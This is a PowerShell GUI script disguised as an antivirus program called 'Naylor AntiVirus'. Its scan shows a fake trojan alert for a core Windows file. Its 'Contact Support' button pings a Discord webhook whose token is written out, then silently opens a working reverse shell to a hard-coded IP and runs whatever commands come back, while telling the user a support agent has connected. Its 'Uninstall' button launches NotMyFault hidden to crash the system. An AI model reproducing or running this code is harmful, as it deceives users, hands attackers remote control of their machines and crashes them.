Add-Type -AssemblyName PresentationFramework

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Naylor AntiVirus"
        Height="500" Width="700"
        WindowStartupLocation="CenterScreen"
        Background="White"
        FontFamily="Comic Sans MS">

    <Grid Margin="20">
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/> <!-- Header -->
        <RowDefinition Height="Auto"/> <!-- Buttons -->
        <RowDefinition Height="*"/>    <!-- Output box -->
        <RowDefinition Height="Auto"/> <!-- Progress bar -->
    </Grid.RowDefinitions>

    <!-- Header -->
    <TextBlock x:Name="HeaderText"
               Text="Naylor AntiVirus"
               FontSize="28"
               FontWeight="Bold"
               HorizontalAlignment="Center"
               VerticalAlignment="Top"
               Margin="0,10,0,20"
               Grid.Row="0"/>

    <!-- Buttons -->
    <StackPanel Grid.Row="1" Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,0,0,10">
        <Button x:Name="RunScanButton" Content="Run Scan" Width="150" Height="40" Margin="0,0,15,0"/>
        <Button x:Name="SupportButton" Content="Contact Support" Width="150" Height="40" Margin="0,0,15,0"/>
        <Button x:Name="UninstallButton" Content="Uninstall" Width="150" Height="40"/>
    </StackPanel>

    <!-- Output box -->
    <RichTextBox x:Name="OutputBox"
                 Grid.Row="2"
                 VerticalScrollBarVisibility="Auto"
                 HorizontalScrollBarVisibility="Auto"
                 IsReadOnly="True"/>

    <!-- Progress bar -->
    <ProgressBar x:Name="SupportProgress"
                 Grid.Row="3"
                 Height="20"
                 Margin="0,10,0,0"
                 Visibility="Collapsed"
                 IsIndeterminate="True"/>
</Grid>

</Window>
"@

# Load XAML
$reader = (New-Object System.Xml.XmlNodeReader $xaml)
$window = [Windows.Markup.XamlReader]::Load($reader)

# Get controls
$runScanButton   = $window.FindName("RunScanButton")
$supportButton   = $window.FindName("SupportButton")
$uninstallButton = $window.FindName("UninstallButton")
$outputBox       = $window.FindName("OutputBox")
$SupportProgress = $window.FindName("SupportProgress") 

# Helper function to append colored text



function Append-Text($rtb, $text, $color = "Black") {
    $run = New-Object System.Windows.Documents.Run($text)

    switch ($color.ToLower()) {
        "red"   { $c = [System.Windows.Media.Color]::FromRgb(255,0,0) }
        "green" { $c = [System.Windows.Media.Color]::FromRgb(0,128,0) }
        default { $c = [System.Windows.Media.Color]::FromRgb(0,0,0) }
    }

    $run.Foreground = New-Object System.Windows.Media.SolidColorBrush($c)
    $paragraph = New-Object System.Windows.Documents.Paragraph($run)
    $rtb.Document.Blocks.Add($paragraph)
    $rtb.ScrollToEnd()
}


# Run Scan button logic
$runScanButton.Add_Click({
    # Clear previous output
    $outputBox.Document.Blocks.Clear()


    $system32Path = "$env:WinDir\System32"

    # Output each file
    Get-ChildItem -Path $system32Path | ForEach-Object {
        Append-Text $outputBox $_.FullName
        Start-Sleep -Milliseconds 2   # tiny delay per file
        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([action]{}, [System.Windows.Threading.DispatcherPriority]::Background)
    }

    # Wait a moment before showing the "malicious file" error
    $outputBox.Document.Blocks.Clear()
    Start-Sleep -Milliseconds 500
    Append-Text $outputBox "error: malicious file found (certainty 95% of process injection/trojan): C:\Windows\System32\ntoskrnl.exe" "Red"
    Append-Text $outputBox "risk level: high. Removal suggested" "Red"
})


$SupportButton.Add_Click({
    # Clear and update output box
    $outputBox.Document.Blocks.Clear()
    Append-Text $outputBox "Contacting a customer support representative, please wait..."

    # Show progress bar
    $SupportProgress.Visibility = "Visible"

    # Send webhook
    $webhookUrl = "https://discord.com/api/webhooks/1410739724120883263/Vs0DTJtuRUEl77c8k5kFQMMncPf7FYwt4OMaPeNdvRg0SSNWRmmKO9JTZDdrnbnh0cfS"
    $payload = @{
        content = "<@548984684160221196> A valued customer desperately requires your help. https://tenor.com/view/wongwingchun58-gif-15613675"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
    } catch {
        Append-Text $outputBox "⚠ Failed to contact support system." "Red"
    }
      Start-Job -ScriptBlock {
        try {
            # === Reverse shell code from your snippet ===
            $LHOST = "172.30.182.171"
            $LPORT = 9001
            $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
            $NetworkStream = $TCPClient.GetStream()
            $StreamReader = New-Object IO.StreamReader($NetworkStream)
            $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
            $StreamWriter.AutoFlush = $true
            $Buffer = New-Object System.Byte[] 1024
            $Code = ""

            # Signal back to GUI that connection succeeded
            [System.Windows.Application]::Current.Dispatcher.Invoke({
                $SupportProgress.Visibility = "Collapsed"
                Append-Text $OutputBox "`nSupport agent connected.`n" "Green"
            })

            while ($TCPClient.Connected) {
                while ($NetworkStream.DataAvailable) {
                    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
                }

                if ($TCPClient.Connected -and $Code.Length -gt 1) {
                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
                    $StreamWriter.Write("$Output`n")
                    $Code = $null
                }
            }

            # Clean up
            $TCPClient.Close()
            $NetworkStream.Close()
            $StreamReader.Close()
            $StreamWriter.Close()
        } catch {
            [System.Windows.Application]::Current.Dispatcher.Invoke({
                $SupportProgress.Visibility = "Collapsed"
                Append-Text $OutputBox "`nError: Unable to connect to support agent.`n" "Red"
            })
        }
    } | Out-Null
})

$uninstallButton.Add_Click({
    $result = [System.Windows.MessageBox]::Show(
        "Are you sure you want to uninstall?",
        "Confirm Uninstall",
        [System.Windows.MessageBoxButton]::YesNo,
        [System.Windows.MessageBoxImage]::Warning
    )

    if ($result -ne [System.Windows.MessageBoxResult]::Yes) {
        Append-Text $outputBox "Uninstall canceled by user.`n" "Gray"
        return
    }

    # Disable UI while "uninstall" runs
    $runScanButton.IsEnabled = $false
    $supportButton.IsEnabled = $false
    $uninstallButton.IsEnabled = $false

    # Clear and show starting message
    $outputBox.Document.Blocks.Clear()
    Append-Text $outputBox "Understood. Uninstalling Windows...`n" "Red"

    # Files to display/delete
    $fileList = @(
        "C:\Windows\System32\kernel32.dll",
        "C:\Windows\System32\win32k.sys",
        "C:\Windows\explorer.exe",
        "C:\Windows\notepad.exe",
        "C:\Windows\System32\drivers\etc\hosts",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\user32.dll",
        "C:\Windows\System32\gdi32.dll",
        "C:\Windows\System32\ntdll.dll",
        "C:\Windows\System32\config\SYSTEM",
        "C:\Windows\System32\config\SOFTWARE"
    )

    # Timing
    $intervalMs    = 300
    $prepDelayMs   = 2000
    $finishDelayMs = 1000

    $prepTicks   = [int][math]::Ceiling($prepDelayMs / $intervalMs)
    $finishTicks = [int][math]::Ceiling($finishDelayMs / $intervalMs)

    # Create one timer
    $timer = New-Object System.Windows.Threading.DispatcherTimer
    $timer.Interval = [TimeSpan]::FromMilliseconds($intervalMs)
    $timer.Tag = [PSCustomObject]@{
        Files       = $fileList
        Index       = 0
        Phase       = 'prep'     # phases: 'prep' -> 'deleting' -> 'finishWait'
        Tick        = 0
        PrepTicks   = $prepTicks
        FinishTicks = $finishTicks
    }

    $timer.add_Tick({
        param($sender, $e)
        $state = $sender.Tag

        switch ($state.Phase) {
            'prep' {
                $state.Tick++
                if ($state.Tick -ge $state.PrepTicks) {
                    $state.Phase = 'deleting'
                    $state.Tick  = 0
                }
            }

            'deleting' {
                if ($state.Index -lt $state.Files.Count) {
                    $path = $state.Files[$state.Index]
                    Append-Text $outputBox "Deleting: $path" "Red"
                    $state.Index++
                } else {
                    $state.Phase = 'finishWait'
                    $state.Tick  = 0
                }
            }

            'finishWait' {
                $state.Tick++
                if ($state.Tick -ge $state.FinishTicks) {
                    $sender.Stop()
                    # Clear and show final message after finish delay
                    $outputBox.Document.Blocks.Clear()
                    Append-Text $outputBox "Uninstall complete. The computer will now explode. Have a nice day!`n" "Green"
                    # Re-enable UI
                    $runScanButton.IsEnabled = $true
                    $supportButton.IsEnabled = $true
                    $uninstallButton.IsEnabled = $true

                    # --- Run NotMyFault (Sysinternals) ---
                   # --- Run NotMyFault (Sysinternals Live) ---
try {
    $exePath = "\\live.sysinternals.com\tools\NotMyFault64.exe"
    if (-not (Test-Path $exePath)) {
        $exePath = "\\live.sysinternals.com\tools\NotMyFault.exe"
    }

    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath -ArgumentList "crash" -WindowStyle Hidden
    } else {
        Append-Text $outputBox "`nComputer cannot explode. Womp womp`n" "Red"
    }
}
catch {
    Append-Text $outputBox "`nError launching NotMyFault from Sysinternals Live: $_`n" "Red"
}

                }
            }
        } # <-- closes switch
    })   # <-- closes timer.add_Tick

    # Start the sequence
    $timer.Start()
}) # <-- closes Add_Click



# Show window
$window.ShowDialog() | Out-Null
